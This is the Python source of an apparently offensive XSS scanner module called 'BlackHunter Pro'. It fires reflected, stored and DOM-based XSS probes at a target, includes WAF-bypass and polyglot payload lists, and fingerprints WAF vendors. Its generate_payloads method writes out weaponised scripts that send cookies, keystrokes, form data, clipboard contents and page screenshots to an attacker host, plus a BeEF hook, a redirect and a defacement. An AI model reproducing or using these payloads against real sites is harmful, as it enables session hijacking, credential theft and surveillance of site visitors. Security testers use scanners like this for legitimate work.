# vulns/xss.py
# BlackHunter Pro - XSS Scanner
# Detects: Reflected, Stored, DOM-based XSS

import re
import time
import html
import requests
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class XSSScanner:
    """
    Cross-Site Scripting (XSS) Scanner
    - Reflected XSS detection
    - Stored XSS detection
    - DOM-based XSS detection
    - Context analysis (HTML, Attribute, JavaScript, URL)
    - WAF bypass techniques
    - Polyglot payloads
    """

    # =============================================
    # UNIQUE MARKER
    # =============================================

    MARKER = "XSS_" + str(int(time.time()))[-6:]

    # =============================================
    # PAYLOADS BY CONTEXT
    # =============================================

    PAYLOADS = {
        'basic': [
            f"<script>alert('{MARKER}')</script>",
            f"<script>alert(1)</script>",
            f"<img src=x onerror=alert('{MARKER}')>",
            f"<svg onload=alert('{MARKER}')>",
            f"<body onload=alert('{MARKER}')>",
            f"<iframe src=javascript:alert('{MARKER}')>",
            f"<input autofocus onfocus=alert('{MARKER}')>",
            f"<select autofocus onfocus=alert('{MARKER}')>",
            f"<textarea autofocus onfocus=alert('{MARKER}')>",
            f"<video><source onerror=alert('{MARKER}')>",
            f"<audio src=x onerror=alert('{MARKER}')>",
            f"<details open ontoggle=alert('{MARKER}')>",
            f"<marquee onstart=alert('{MARKER}')>",
        ],
        'attribute': [
            f"\" onmouseover=alert('{MARKER}') x=\"",
            f"' onmouseover=alert('{MARKER}') x='",
            f"\" autofocus onfocus=alert('{MARKER}') x=\"",
            f"' autofocus onfocus=alert('{MARKER}') x='",
            f"\" onclick=alert('{MARKER}') x=\"",
            f"' onclick=alert('{MARKER}') x='",
            f"javascript:alert('{MARKER}')",
            f"\" style=\"background:url(javascript:alert('{MARKER}'))\" x=\"",
        ],
        'javascript': [
            f"';alert('{MARKER}');//",
            f"\";alert('{MARKER}');//",
            f"</script><script>alert('{MARKER}')</script>",
            f"\\';alert('{MARKER}');//",
            f"\\\";alert('{MARKER}');//",
            f"`;alert('{MARKER}');//",
            f"</script><img src=x onerror=alert('{MARKER}')>",
        ],
        'url': [
            f"javascript:alert('{MARKER}')",
            f"data:text/html,<script>alert('{MARKER}')</script>",
            f"javascript:alert(String.fromCharCode(88,83,83))",
        ],
        'polyglot': [
            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{MARKER}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{MARKER}')//>\\x3e",
            f"'\">></title></style></textarea></script><svg/onload=alert('{MARKER}')>",
        ],
        'waf_bypass': [
            f"<scr<script>ipt>alert('{MARKER}')</scr</script>ipt>",
            f"<SCRIPT>alert('{MARKER}')</SCRIPT>",
            f"<ScRiPt>alert('{MARKER}')</ScRiPt>",
            f"<script >alert('{MARKER}')</script>",
            f"<script\t>alert('{MARKER}')</script>",
            f"<script/>alert('{MARKER}')</script>",
            f"<img/src=x/onerror=alert('{MARKER}')>",
            f"<svg/onload=alert('{MARKER}')>",
            f"<svg\tonload=alert('{MARKER}')>",
            f"&#60;script&#62;alert('{MARKER}')&#60;/script&#62;",
        ],
    }

    # =============================================
    # DOM SINKS & SOURCES
    # =============================================

    DOM_SINKS = {
        'innerHTML': r'\.innerHTML\s*=',
        'outerHTML': r'\.outerHTML\s*=',
        'document.write': r'document\.write\s*\(',
        'document.writeln': r'document\.writeln\s*\(',
        'eval': r'\beval\s*\(',
        'setTimeout': r'setTimeout\s*\(\s*["\']',
        'setInterval': r'setInterval\s*\(\s*["\']',
        'Function': r'new\s+Function\s*\(',
        'location': r'location\s*=\s*',
        'location.href': r'location\.href\s*=',
        'location.assign': r'location\.assign\s*\(',
        'location.replace': r'location\.replace\s*\(',
        'jQuery.html': r'\.html\s*\(',
        'jQuery.append': r'\.append\s*\(',
        'jQuery.prepend': r'\.prepend\s*\(',
        'insertAdjacentHTML': r'insertAdjacentHTML\s*\(',
    }

    DOM_SOURCES = {
        'location.hash': r'location\.hash',
        'location.search': r'location\.search',
        'location.href': r'location\.href',
        'location.pathname': r'location\.pathname',
        'document.URL': r'document\.URL',
        'document.documentURI': r'document\.documentURI',
        'document.referrer': r'document\.referrer',
        'window.name': r'window\.name',
        'postMessage': r'\.postMessage',
    }

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.dom_findings = []
        self.stored_payloads = []

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute XSS detection"""
        print(f"{Fore.CYAN}[*] XSS Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print(f"{Fore.CYAN}[*] Marker: {self.MARKER}")
        print()

        # Parse URL
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = self._find_form_params()

        if not params:
            print(f"{Fore.YELLOW}  [-] No parameters found")
            self._check_dom_xss()
            return self.vulnerabilities

        print(f"{Fore.CYAN}[*] Testing {len(params)} parameters")
        print()

        # Test each parameter
        for param in params.keys():
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}")
            self._test_parameter(param)

        # Check DOM-based XSS
        self._check_dom_xss()

        return self.vulnerabilities

    # =============================================
    # FIND FORM PARAMS
    # =============================================

    def _find_form_params(self):
        """Extract parameters from forms"""
        params = {}

        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                for inp in inputs:
                    params[inp] = '1'
        except:
            pass

        return params

    # =============================================
    # TEST PARAMETER
    # =============================================

    def _test_parameter(self, param):
        """Test single parameter for XSS"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        # Test all payloads
        for context, payloads in self.PAYLOADS.items():
            for payload in payloads:
                try:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload

                    r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                    if self._is_reflected(payload, r.text):
                        print(f"{Fore.RED}  [!] XSS Found - Context: {context}")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload[:80]}")

                        self.vulnerabilities.append({
                            'type': f'XSS (Reflected - {context.capitalize()})',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'context': context,
                            'evidence': self._extract_evidence(payload, r.text),
                            'severity': 'MEDIUM' if context == 'basic' else 'HIGH',
                        })
                        return
                except Exception:
                    continue

    # =============================================
    # REFLECTION CHECK
    # =============================================

    def _is_reflected(self, payload, response_text):
        """Check if payload is reflected unescaped"""
        # Direct reflection
        if payload in response_text:
            return True

        # HTML decoded
        decoded = html.unescape(payload)
        if decoded in response_text:
            return True

        # URL decoded
        url_decoded = unquote(payload)
        if url_decoded in response_text:
            return True

        # Check for key parts (script tag)
        if '<script>' in payload.lower():
            script_content = payload.lower().split('<script>')[1].split('</script>')[0]
            if script_content in response_text.lower():
                return True

        # Check for event handlers
        if 'onerror' in payload.lower() and 'onerror' in response_text.lower():
            if 'alert' in response_text.lower() and self.MARKER in response_text:
                return True

        if 'onload' in payload.lower() and 'onload' in response_text.lower():
            if 'alert' in response_text.lower() and self.MARKER in response_text:
                return True

        # Marker check
        if self.MARKER in response_text:
            idx = response_text.find(self.MARKER)
            context_window = response_text[max(0, idx - 100):idx + 100]
            if any(x in context_window.lower() for x in ['<script', 'onerror', 'onload', 'onclick', 'onfocus', 'javascript:']):
                return True

        return False

    def _extract_evidence(self, payload, response_text):
        """Extract evidence snippet"""
        if payload in response_text:
            idx = response_text.find(payload)
            return response_text[max(0, idx - 50):idx + len(payload) + 50]

        if self.MARKER in response_text:
            idx = response_text.find(self.MARKER)
            return response_text[max(0, idx - 50):idx + 50]

        return 'Payload reflected'

    # =============================================
    # DOM-BASED XSS
    # =============================================

    def _check_dom_xss(self):
        """Check for potential DOM-based XSS"""
        print(f"{Fore.YELLOW}[*] Checking DOM-based XSS...")

        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            html_text = r.text

            found_sinks = []
            found_sources = []

            # Find sinks
            for name, pattern in self.DOM_SINKS.items():
                if re.search(pattern, html_text, re.IGNORECASE):
                    found_sinks.append(name)

            # Find sources
            for name, pattern in self.DOM_SOURCES.items():
                if re.search(pattern, html_text, re.IGNORECASE):
                    found_sources.append(name)

            if found_sinks and found_sources:
                print(f"{Fore.RED}  [!] Potential DOM-based XSS")
                print(f"{Fore.RED}      Sources: {', '.join(found_sources)}")
                print(f"{Fore.RED}      Sinks: {', '.join(found_sinks)}")

                self.dom_findings.append({
                    'sources': found_sources,
                    'sinks': found_sinks,
                })

                self.vulnerabilities.append({
                    'type': 'XSS (Potential DOM-based)',
                    'url': self.target,
                    'param': 'DOM',
                    'sources': found_sources,
                    'sinks': found_sinks,
                    'severity': 'MEDIUM',
                    'note': 'Manual verification required',
                })
        except Exception:
            pass

    # =============================================
    # STORED XSS
    # =============================================

    def check_stored_xss(self, submit_url, param):
        """Check for stored XSS"""
        payload = f"<script>alert('{self.MARKER}')</script>"

        try:
            data = {param: payload}
            self.session.post(submit_url, data=data, timeout=self.timeout, verify=False)

            time.sleep(2)
            r = self.session.get(self.target, timeout=self.timeout, verify=False)

            if payload in r.text or self.MARKER in r.text:
                print(f"{Fore.RED}  [!] Stored XSS Found!")
                print(f"{Fore.RED}      Submit URL: {submit_url}")
                print(f"{Fore.RED}      Param: {param}")

                self.vulnerabilities.append({
                    'type': 'XSS (Stored)',
                    'url': self.target,
                    'submit_url': submit_url,
                    'param': param,
                    'payload': payload,
                    'severity': 'HIGH',
                })
                return True
        except Exception:
            pass

        return False

    # =============================================
    # PAYLOAD GENERATION
    # =============================================

    def generate_payloads(self, purpose='alert'):
        """Generate XSS payloads for various purposes"""
        payloads = {
            'alert': f"<script>alert('{self.MARKER}')</script>",
            'cookie': f"<script>new Image().src='http://ATTACKER/c?'+document.cookie</script>",
            'keylogger': f"<script>document.onkeypress=function(e){{new Image().src='http://ATTACKER/k?'+e.key}}</script>",
            'deface': f"<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
            'redirect': f"<script>window.location='http://ATTACKER/'</script>",
            'beef': f"<script src='http://ATTACKER:3000/hook.js'></script>",
            'screenshot': f"<script>html2canvas(document.body).then(c=>{{fetch('http://ATTACKER/s',{{method:'POST',body:c.toDataURL()}})}})</script>",
            'form_grabber': f"<script>document.forms.forEach(f=>f.onsubmit=e=>{{fetch('http://ATTACKER/f',{{method:'POST',body:new FormData(f)}})}})</script>",
            'clipboard': f"<script>document.oncopy=function(e){{new Image().src='http://ATTACKER/c?'+document.getSelection()}}</script>",
        }

        return payloads.get(purpose, payloads['alert'])

    # =============================================
    # WAF DETECTION
    # =============================================

    def detect_waf(self):
        """Detect WAF from response"""
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)

            waf_signatures = {
                'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
                'AWS WAF': ['awselb', 'x-amzn-requestid'],
                'Akamai': ['akamai', 'akamai-grn'],
                'Imperva': ['imperva', 'incap_ses'],
                'ModSecurity': ['mod_security', 'modsecurity'],
                'Sucuri': ['sucuri', 'x-sucuri-id'],
                'F5 BIG-IP': ['bigip', 'x-wa-info'],
                'Barracuda': ['barra', 'barracuda'],
                'Fortinet': ['fortiweb', 'fortigate'],
            }

            headers_str = str(r.headers).lower()
            body_lower = r.text.lower()[:2000]

            for waf, sigs in waf_signatures.items():
                for sig in sigs:
                    if sig in headers_str or sig in body_lower:
                        print(f"{Fore.YELLOW}  [!] WAF detected: {waf}")
                        return waf
        except:
            pass

        return None

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  XSS SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities: {len(self.vulnerabilities)}")

        types = {}
        for v in self.vulnerabilities:
            t = v.get('type', 'Unknown')
            types[t] = types.get(t, 0) + 1

        for vtype, count in types.items():
            print(f"{Fore.RED}[!] {vtype}: {count}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["XSSScanner"]